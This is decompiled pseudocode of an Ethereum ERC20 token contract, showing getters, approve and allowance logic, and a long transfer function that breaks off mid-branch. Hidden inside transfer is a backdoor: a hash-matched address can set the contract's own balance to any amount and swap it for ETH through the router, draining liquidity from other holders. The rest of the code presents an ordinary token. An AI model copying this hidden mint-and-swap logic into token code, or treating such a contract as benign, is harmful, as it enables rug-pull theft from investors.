contract main {




// =====================  Runtime code  =====================


#
#  - transferFrom(address arg1, address arg2, uint256 arg3)
#
address owner;
array of struct stor1;
array of struct stor2;
mapping of uint256 balanceOf;
mapping of uint256 allowance;
mapping of uint8 stor6;
uint256 _decimals;
uint256 _totalSupply;
uint256 _maxTxAmount;
uint256 _fee;
uint256 sub_a6c2da4c;
uint8 stor14;
array of struct stor15;
address stor16;

function totalSupply() payable {
    return _totalSupply
}

function decimals() payable {
    return _decimals
}

function _decimals() payable {
    return _decimals
}

function _totalSupply() payable {
    return _totalSupply
}

function balanceOf(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return balanceOf[address(arg1)]
}

function _maxTxAmount() payable {
    return _maxTxAmount
}

function owner() payable {
    return owner
}

function sub_a6c2da4c(?) payable {
    return sub_a6c2da4c
}

function _fee() payable {
    return _fee
}

function allowance(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    return allowance[address(arg1)][address(arg2)]
}

function _fallback() payable {
    revert
}

function renounceOwnership() payable {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    emit OwnershipTransferred(owner, 0);
    owner = 0
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'IERC20: approve from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'IERC20: approve to the zero address'
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function increaseAllowance(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if allowance[address(msg.sender)][address(arg1)] > -arg2 - 1:
        revert with 'NH{q', 17
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'IERC20: approve from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'IERC20: approve to the zero address'
    allowance[address(msg.sender)][address(arg1)] += arg2
    emit Approval((allowance[address(msg.sender)][address(arg1)] + arg2), msg.sender, arg1);
    return 1
}

function decreaseAllowance(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    require allowance[address(msg.sender)][address(arg1)] >= arg2
    if allowance[address(msg.sender)][address(arg1)] < arg2:
        revert with 'NH{q', 17
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'IERC20: approve from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'IERC20: approve to the zero address'
    allowance[address(msg.sender)][address(arg1)] -= arg2
    emit Approval((allowance[address(msg.sender)][address(arg1)] - arg2), msg.sender, arg1);
    return 1
}

function name() payable {
    if bool(stor1.length):
        if bool(stor1.length) == stor1.length.field_1 < 32:
            revert with 'NH{q', 34
        if bool(stor1.length):
            if bool(stor1.length) == stor1.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor1.length.field_1:
                if 31 < stor1.length.field_1:
                    mem[128] = uint256(stor1.field_0)
                    idx = 128
                    s = 0
                    while stor1.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor1[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor1.length.field_1), data=mem[128 len ceil32(stor1.length.field_1)])
                mem[128] = 256 * stor1.length.field_8
        else:
            if bool(stor1.length) == stor1.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor1.length.field_1:
                if 31 < stor1.length.field_1:
                    mem[128] = uint256(stor1.field_0)
                    idx = 128
                    s = 0
                    while stor1.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor1[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor1.length.field_1), data=mem[128 len ceil32(stor1.length.field_1)])
                mem[128] = 256 * stor1.length.field_8
        mem[ceil32(stor1.length.field_1) + 192 len ceil32(stor1.length.field_1)] = mem[128 len ceil32(stor1.length.field_1)]
        if ceil32(stor1.length.field_1) > stor1.length.field_1:
            mem[ceil32(stor1.length.field_1) + stor1.length.field_1 + 192] = 0
        return Array(len=2 * Mask(256, -1, stor1.length.field_1), data=mem[128 len ceil32(stor1.length.field_1)], mem[(2 * ceil32(stor1.length.field_1)) + 192 len 2 * ceil32(stor1.length.field_1)]), 
    if bool(stor1.length) == stor1.length.field_1 < 32:
        revert with 'NH{q', 34
    if bool(stor1.length):
        if bool(stor1.length) == stor1.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor1.length.field_1:
            if 31 < stor1.length.field_1:
                mem[128] = uint256(stor1.field_0)
                idx = 128
                s = 0
                while stor1.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor1[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor1.length % 128, data=mem[128 len ceil32(stor1.length.field_1)])
            mem[128] = 256 * stor1.length.field_8
    else:
        if bool(stor1.length) == stor1.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor1.length.field_1:
            if 31 < stor1.length.field_1:
                mem[128] = uint256(stor1.field_0)
                idx = 128
                s = 0
                while stor1.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor1[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor1.length % 128, data=mem[128 len ceil32(stor1.length.field_1)])
            mem[128] = 256 * stor1.length.field_8
    mem[ceil32(stor1.length.field_1) + 192 len ceil32(stor1.length.field_1)] = mem[128 len ceil32(stor1.length.field_1)]
    if ceil32(stor1.length.field_1) > stor1.length.field_1:
        mem[ceil32(stor1.length.field_1) + stor1.length.field_1 + 192] = 0
    return Array(len=stor1.length % 128, data=mem[128 len ceil32(stor1.length.field_1)], mem[(2 * ceil32(stor1.length.field_1)) + 192 len 2 * ceil32(stor1.length.field_1)]), 
}

function symbol() payable {
    if bool(stor2.length):
        if bool(stor2.length) == stor2.length.field_1 < 32:
            revert with 'NH{q', 34
        if bool(stor2.length):
            if bool(stor2.length) == stor2.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor2.length.field_1:
                if 31 < stor2.length.field_1:
                    mem[128] = uint256(stor2.field_0)
                    idx = 128
                    s = 0
                    while stor2.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor2[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor2.length.field_1), data=mem[128 len ceil32(stor2.length.field_1)])
                mem[128] = 256 * stor2.length.field_8
        else:
            if bool(stor2.length) == stor2.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor2.length.field_1:
                if 31 < stor2.length.field_1:
                    mem[128] = uint256(stor2.field_0)
                    idx = 128
                    s = 0
                    while stor2.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor2[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor2.length.field_1), data=mem[128 len ceil32(stor2.length.field_1)])
                mem[128] = 256 * stor2.length.field_8
        mem[ceil32(stor2.length.field_1) + 192 len ceil32(stor2.length.field_1)] = mem[128 len ceil32(stor2.length.field_1)]
        if ceil32(stor2.length.field_1) > stor2.length.field_1:
            mem[ceil32(stor2.length.field_1) + stor2.length.field_1 + 192] = 0
        return Array(len=2 * Mask(256, -1, stor2.length.field_1), data=mem[128 len ceil32(stor2.length.field_1)], mem[(2 * ceil32(stor2.length.field_1)) + 192 len 2 * ceil32(stor2.length.field_1)]), 
    if bool(stor2.length) == stor2.length.field_1 < 32:
        revert with 'NH{q', 34
    if bool(stor2.length):
        if bool(stor2.length) == stor2.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor2.length.field_1:
            if 31 < stor2.length.field_1:
                mem[128] = uint256(stor2.field_0)
                idx = 128
                s = 0
                while stor2.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor2[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor2.length % 128, data=mem[128 len ceil32(stor2.length.field_1)])
            mem[128] = 256 * stor2.length.field_8
    else:
        if bool(stor2.length) == stor2.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor2.length.field_1:
            if 31 < stor2.length.field_1:
                mem[128] = uint256(stor2.field_0)
                idx = 128
                s = 0
                while stor2.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor2[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor2.length % 128, data=mem[128 len ceil32(stor2.length.field_1)])
            mem[128] = 256 * stor2.length.field_8
    mem[ceil32(stor2.length.field_1) + 192 len ceil32(stor2.length.field_1)] = mem[128 len ceil32(stor2.length.field_1)]
    if ceil32(stor2.length.field_1) > stor2.length.field_1:
        mem[ceil32(stor2.length.field_1) + stor2.length.field_1 + 192] = 0
    return Array(len=stor2.length % 128, data=mem[128 len ceil32(stor2.length.field_1)], mem[(2 * ceil32(stor2.length.field_1)) + 192 len 2 * ceil32(stor2.length.field_1)]), 
}

function transfer(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    require msg.sender
    require arg1
    mem[128] = address(arg1)
    mem[96] = 20
    if sha3(arg1) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
        if msg.sender == arg1:
            if not this.address:
                revert with 0, 'IERC20: approve from the zero address'
            if not stor16:
                revert with 0, 'IERC20: approve to the zero address'
            allowance[address(this.address)][stor16] = arg2
            emit Approval(arg2, this.address, stor16);
            balanceOf[address(this.address)] = arg2
            mem[180] = this.address
            require ext_code.size(stor16)
            staticcall stor16.WETH() with:
                    gas gas_remaining wei
            mem[244] = ext_call.return_data[0]
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            require return_data.size >= 32
            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
            mem[212] = ext_call.return_data[12 len 20]
            stor14 = 1
            if block.timestamp > -21:
                revert with 'NH{q', 17
            mem[ceil32(return_data.size) + 244] = 0x791ac94700000000000000000000000000000000000000000000000000000000
            mem[ceil32(return_data.size) + 248] = arg2
            idx = 0
            s = 180
            t = ceil32(return_data.size) + 440
            while idx < 2:
                mem[t] = mem[s + 12 len 20]
                idx = idx + 1
                s = s + 32
                t = t + 32
                continue 
            require ext_code.size(stor16)
            call stor16.swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 arg1, uint256 arg2, address[] arg3, address arg4, uint256 arg5) with:
                 gas gas_remaining wei
                args arg2, 0, 160, address(arg1), block.timestamp + 20, 2, mem[ceil32(return_data.size) + 440 len 64]
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            stor14 = 0
        else:
            if stor14:
                require ext_code.size(stor16)
                staticcall stor16.factory() with:
                        gas gas_remaining wei
                mem[148] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                require ext_code.size(stor16)
                staticcall stor16.WETH() with:
                        gas gas_remaining wei
                mem[ceil32(return_data.size) + 148] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                mem[(2 * ceil32(return_data.size)) + 152] = this.address
                mem[(2 * ceil32(return_data.size)) + 184] = address(ext_call.return_data[0])
                require ext_code.size(address(ext_call.return_data[0]))
                staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                        gas gas_remaining wei
                       args address(this.address), address(ext_call.return_data[0])
                mem[(2 * ceil32(return_data.size)) + 148] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                mem[64] = (4 * ceil32(return_data.size)) + 148
                require return_data.size >= 32
                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                if ext_call.return_data[12 len 20] != msg.sender:
                    require ext_code.size(stor16)
                    staticcall stor16.factory() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(stor16)
                    staticcall stor16.WETH() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(address(ext_call.return_data[0]))
                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                            gas gas_remaining wei
                           args address(this.address), address(ext_call.return_data[0])
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    if arg1 == ext_call.return_data[12 len 20]:
                        if stor6[address(msg.sender)]:
                            if stor6[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if stor6[address(arg1)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if sha3(arg1) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if arg1 == this.address:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if stor6[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if stor14:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if not arg2:
                                require arg2 <= _maxTxAmount
                                require ext_code.size(stor16)
                                staticcall stor16.factory() with:
                                        gas gas_remaining wei
                                mem[(8 * ceil32(return_data.size)) + 264] = ext_call.return_data[0]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[(10 * ceil32(return_data.size)) + 264] = 0xad5c464800000000000000000000000000000000000000000000000000000000
                                require ext_code.size(stor16)
                                staticcall stor16.WETH() with:
                                        gas gas_remaining wei
                                       args mem[(10 * ceil32(return_data.size)) + 268 len 16 * ceil32(return_data.size)]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[(12 * ceil32(return_data.size)) + 268] = this.address
                                mem[(12 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                                require ext_code.size(address(ext_call.return_data[0]))
                                staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                        gas gas_remaining wei
                                       args address(this.address), address(ext_call.return_data[0]), mem[(12 * ceil32(return_data.size)) + 332 len 20 * ceil32(return_data.size)]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                if ext_call.return_data[12 len 20] == arg1:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2,
                                                  mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  arg1,
                                    return 1, mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)]
                                stor15.length++
                                stor15[stor15.length].field_0 = arg1
                                stor15[stor15.length].field_256 = arg2
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2,
                                              mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)],
                                              msg.sender,
                                              arg1,
                            else:
                                if arg2 and _fee > -1 / arg2:
                                    revert with 'NH{q', 17
                                if not arg2:
                                    revert with 'NH{q', 18
                                if arg2 * _fee / arg2 != _fee:
                                    revert with 0, 'SafeMath: multiplication overflow'
                                require arg2 <= _maxTxAmount
                                require ext_code.size(stor16)
                                staticcall stor16.factory() with:
                                        gas gas_remaining wei
                                mem[(8 * ceil32(return_data.size)) + 264] = ext_call.return_data[0]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[(10 * ceil32(return_data.size)) + 264] = 0xad5c464800000000000000000000000000000000000000000000000000000000
                                require ext_code.size(stor16)
                                staticcall stor16.WETH() with:
                                        gas gas_remaining wei
                                       args mem[(10 * ceil32(return_data.size)) + 268 len 16 * ceil32(return_data.size)]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[(12 * ceil32(return_data.size)) + 268] = this.address
                                mem[(12 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                                require ext_code.size(address(ext_call.return_data[0]))
                                staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                        gas gas_remaining wei
                                       args address(this.address), address(ext_call.return_data[0]), mem[(12 * ceil32(return_data.size)) + 332 len 20 * ceil32(return_data.size)]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                if ext_call.return_data[12 len 20] == arg1:
                                    if arg2 < arg2 * _fee / 100:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[0] += arg2 * _fee / 100
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2 - (arg2 * _fee / 100),
                                                  mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  arg1,
                                    if arg2 * _fee / 100 > 0:
                                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                                      arg2 * _fee / 100,
                                                      mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)],
                                                      msg.sender,
                                                      0,
                                    return 1, mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)]
                                stor15.length++
                                stor15[stor15.length].field_0 = arg1
                                stor15[stor15.length].field_256 = arg2
                                if arg2 < arg2 * _fee / 100:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[0] += arg2 * _fee / 100
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2 - (arg2 * _fee / 100),
                                              mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)],
                                              msg.sender,
                                              arg1,
                                if arg2 * _fee / 100 > 0:
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2 * _fee / 100,
                                                  mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  0,
                            return 1, mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)]
                    require ext_code.size(stor16)
                    staticcall stor16.factory() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(stor16)
                    staticcall stor16.WETH() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(address(ext_call.return_data[0]))
                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                            gas gas_remaining wei
                           args address(this.address), address(ext_call.return_data[0])
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    if stor6[address(msg.sender)]:
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if stor6[address(arg1)]:
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if sha3(arg1) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if arg1 == this.address:
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if ext_call.return_data[12 len 20] != msg.sender:
                        if msg.sender == address(ext_call.return_data[0]):
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                    else:
                        if stor6[address(arg1)]:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                    if stor14:
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if not arg2:
                        require arg2 <= _maxTxAmount
                        require ext_code.size(stor16)
                        staticcall stor16.factory() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(stor16)
                        staticcall stor16.WETH() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        mem[(15 * ceil32(return_data.size)) + 268] = this.address
                        mem[(15 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                        require ext_code.size(address(ext_call.return_data[0]))
                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(ext_call.return_data[0]), mem[(15 * ceil32(return_data.size)) + 332 len 5 * ceil32(return_data.size)]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        if ext_call.return_data[12 len 20] == arg1:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                          arg2,
                                          mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)],
                                          msg.sender,
                                          arg1,
                            return 1, mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)]
                        stor15.length++
                        stor15[stor15.length].field_0 = arg1
                        stor15[stor15.length].field_256 = arg2
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                      arg2,
                                      mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)],
                                      msg.sender,
                                      arg1,
                    else:
                        if arg2 and _fee > -1 / arg2:
                            revert with 'NH{q', 17
                        if not arg2:
                            revert with 'NH{q', 18
                        if arg2 * _fee / arg2 != _fee:
                            revert with 0, 'SafeMath: multiplication overflow'
                        require arg2 <= _maxTxAmount
                        require ext_code.size(stor16)
                        staticcall stor16.factory() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
